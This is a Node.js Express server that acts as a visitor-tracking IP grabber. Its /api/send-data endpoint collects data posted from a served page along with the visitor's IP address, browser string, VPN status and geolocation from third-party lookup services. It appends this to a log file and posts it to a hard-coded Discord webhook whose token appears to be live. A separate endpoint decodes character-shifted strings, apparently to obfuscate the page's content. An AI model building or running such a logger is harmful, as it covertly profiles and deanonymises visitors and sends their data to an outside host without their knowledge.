const WhichBrowser = require("which-browser");
const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();
const PORT = 8080;

// Replace with your Discord webhook URL
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1383627882546593802/gQSawFkguI-NVsgDHnFlvt8UO5QAySwrAj4svcxpYEzR3SOUmBdGWsLrXRxCjvzx1bsy";

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.set("trust proxy", ["loopback", "linklocal", "uniquelocal"]); // safer

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/html/newindex.html");
});
app.get("/idk", (req, res) => {
  let g = req.query.url || "";
  let v = [];
  let l = g.split("").forEach((t) => {
    v.push(String.fromCharCode(t.charCodeAt(0) - 6));
  });
  res.send(v.join(""));
});

function getBestPublicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  const socketIp = req.socket.remoteAddress;
  const ipList = [];

  if (forwarded) {
    ipList.push(...forwarded.split(",").map((ip) => ip.trim()));
  }

  if (socketIp) {
    ipList.push(socketIp);
  }

  // Filter out internal/private IPs
  const publicIp = ipList.find((ip) => !isPrivateIp(ip));
  return publicIp || null;
}

function isPrivateIp(ip) {
  // Remove IPv6 prefix if present (e.g., "::ffff:192.168.1.1")
  ip = ip.replace(/^::ffff:/, "");

  return (
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    (ip.startsWith("172.") && isInRange(ip, 16, 31)) ||
    ip === "127.0.0.1" ||
    ip === "::1"
  );
}

function isInRange(ip, start, end) {
  const parts = ip.split(".");
  return (
    parseInt(parts[0]) === 172 &&
    parseInt(parts[1]) >= start &&
    parseInt(parts[1]) <= end
  );
}

// Internal endpoint to receive data from the client
app.post("/api/send-data", async (req, res) => {
  const requestIp = require("request-ip");
  let possibleIps = [
    req.ip,
    req.ips,
    req.connection.remoteAddress,
    req.socket.remoteAddress,
    req.connection.socket?.remoteAddress,
    getBestPublicIp(req),
  ];
  console.log(possibleIps);
  userIP = requestIp.getClientIp(req);
  res.sendStatus(204); // respond quickly
  let data = req.body;
  let ipdat = {};
  try {
    ipdat = await axios.get(`https://ipapi.co/${userIP}/json`);
  } catch (err) {
    console.log("using fallback IP...");
    ipdat = await axios.get(
      `https://api.allorigins.win/raw?url=https://ipapi.co/${userIP}/json`
    );
  }
  // extra data from headers
  data["Client String"] = new WhichBrowser(req.headers).toString();
  let VPNdat = await axios.get(`https://proxycheck.io/v2/${userIP}?vpn=1`);
  let locdat = await axios.get(
    `https://api.hackertarget.com/geoip/?q=${userIP}`
  );
  let g = (s) => Object.fromEntries(s.split("\n").map((l) => l.split(": ")));
  locdat = g(locdat.data);
  console.log(userIP);
  if (!ipdat.data.ip) {
    ipdat.data = { ERROR: "Data not available, API was rate limited" };
    console.log("fallback failed. we got tha ip tho");
  }
  data = {
    "============== :START": "==============",
    "Channel ID": DISCORD_WEBHOOK_URL.slice(33, 50),
    "Bare IP": userIP,
    ...data,
    "=== :CONNECTION": "===",
    ...VPNdat.data[userIP],
    ...ipdat.data,
    "=== :EXTRA": "===",
    ...locdat,
    "=== :END": "===",
  };

  // Convert the body object into a string format: key1: val1 \n key2: val2
  const message = Object.entries(data)
    .map(([key, value]) => `${key}: ${value}`)
    .join("\n");

  // Send data to Discord webhook
  fs.appendFileSync("logs.txt", message);
  try {
    await axios.post(DISCORD_WEBHOOK_URL, { content: message });
  } catch (error) {
    console.error("Error sending to Discord:", error);
    res.sendStatus(500); // Internal Server Error
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
